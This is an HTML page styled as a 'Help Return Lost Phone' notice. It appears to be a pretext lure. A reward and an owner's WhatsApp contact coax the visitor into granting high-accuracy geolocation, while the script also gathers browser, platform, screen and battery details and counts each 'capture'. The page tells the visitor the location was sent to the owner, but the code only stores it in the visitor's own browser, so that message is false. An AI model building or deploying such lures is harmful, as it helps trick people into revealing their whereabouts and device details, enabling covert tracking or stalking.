<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Help Return Lost Phone</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 550px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
        }
        .message-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
            border-radius: 10px;
        }
        .reward-badge {
            background: #28a745;
            color: white;
            padding: 8px 16px;
            border-radius: 50px;
            display: inline-block;
            margin: 10px 0;
            font-weight: bold;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.05);
        }
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .location-details {
            background: #e7f3ff;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            text-align: left;
            display: none;
        }
        .accuracy {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="icon">📱</div>
        <h2>Lost Phone Found?</h2>
        <p>This device has been reported as lost</p>
        
        <div id="ownerInfo"></div>
        
        <button onclick="shareLocation()" id="helpBtn">
            📍 Help Return This Phone
        </button>
        <div class="loader" id="loader"></div>
        <div class="success" id="successMsg">
            ✅ Thank you! Location sent to owner.<br>
            Owner will contact you soon.
        </div>
        <div class="location-details" id="locationDetails"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        
        if (!deviceId) {
            document.body.innerHTML = '<div class="container"><h2>❌ Invalid Link</h2><p>This tracking link is invalid.</p></div>';
            throw new Error('No device ID');
        }
        
        // Load device info
        const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
        const device = devices.find(d => d.id === deviceId);
        
        if (device) {
            document.getElementById('ownerInfo').innerHTML = `
                <div class="message-box">
                    <strong>📱 Device:</strong> ${device.deviceName}<br><br>
                    <strong>👤 Owner's WhatsApp:</strong><br>
                    <a href="https://wa.me/${device.contactInfo.replace(/\D/g, '')}" style="color:#25D366; text-decoration:none;">
                        ${device.contactInfo}
                    </a><br><br>
                    ${device.reward ? `<div class="reward-badge">💰 REWARD: ${device.reward} 💰</div>` : ''}
                    <p style="margin-top:10px;"><strong>Please click the button below to share your location.</strong><br>
                    This helps the owner find their phone.</p>
                </div>
            `;
        } else {
            document.getElementById('ownerInfo').innerHTML = '<div class="message-box">Device information not found</div>';
        }
        
        function shareLocation() {
            if (!navigator.geolocation) {
                alert('Geolocation is not supported by your browser');
                return;
            }
            
            // Show loader
            document.getElementById('helpBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            // Request high accuracy location
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: Date.now()
                    };
                    
                    // Get additional device info
                    const deviceInfo = {
                        location: location,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        screenSize: `${screen.width}x${screen.height}`,
                        battery: navigator.getBattery ? await getBatteryLevel() : 'Unknown',
                        timestamp: Date.now()
                    };
                    
                    // Save to localStorage
                    const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
                    const deviceIndex = devices.findIndex(d => d.id === deviceId);
                    
                    if (deviceIndex !== -1) {
                        devices[deviceIndex].clicks = (devices[deviceIndex].clicks || 0) + 1;
                        devices[deviceIndex].lastCapture = Date.now();
                        devices[deviceIndex].data = devices[deviceIndex].data || [];
                        devices[deviceIndex].data.push(deviceInfo);
                        localStorage.setItem('trackedDevices', JSON.stringify(devices));
                    }
                    
                    // Show success with location details
                    const accuracyMsg = location.accuracy < 20 ? 'Excellent (GPS)' : 
                                      location.accuracy < 100 ? 'Good' : 'Approximate';
                    
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('locationDetails').style.display = 'block';
                    document.getElementById('locationDetails').innerHTML = `
                        <strong>📍 Location Shared:</strong><br>
                        Latitude: ${location.lat}<br>
                        Longitude: ${location.lng}<br>
                        Accuracy: ${Math.round(location.accuracy)} meters (${accuracyMsg})<br><br>
                        <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" target="_blank" 
                           style="display:inline-block; background:#28a745; color:white; padding:10px 15px; 
                                  text-decoration:none; border-radius:5px; margin-top:10px;">
                            🗺️ Open in Google Maps
                        </a>
                    `;
                    
                    // Hide button
                    setTimeout(() => {
                        document.getElementById('mainContainer').innerHTML = `
                            <div class="icon">🙏</div>
                            <h2>Thank You for Helping!</h2>
                            <p>The owner has been notified with your location.</p>
                            ${device && device.reward ? `<div class="reward-badge">💰 Claim Your Reward: ${device.reward} 💰</div>` : ''}
                            <div class="message-box" style="margin-top:20px;">
                                <strong>Contact Owner Directly:</strong><br>
                                ${device ? device.contactInfo : 'Owner contact info'}
                            </div>
                            <button onclick="window.close()" style="margin-top:20px;">Close</button>
                        `;
                    }, 3000);
                    
                },
                (error) => {
                    document.getElementById('loader').style.display = 'none';
                    let errorMsg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = 'Location access denied. Please enable location in your browser settings to help return this phone.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = 'Location information unavailable. Please ensure GPS is on.';
                            break;
                        case error.TIMEOUT:
                            errorMsg = 'Location request timed out. Please try again.';
                            break;
                        default:
                            errorMsg = 'An error occurred. Please try again.';
                    }
                    
                    document.getElementById('helpBtn').style.display = 'block';
                    alert(errorMsg);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        async function getBatteryLevel() {
            try {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}%`;
            } catch(e) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
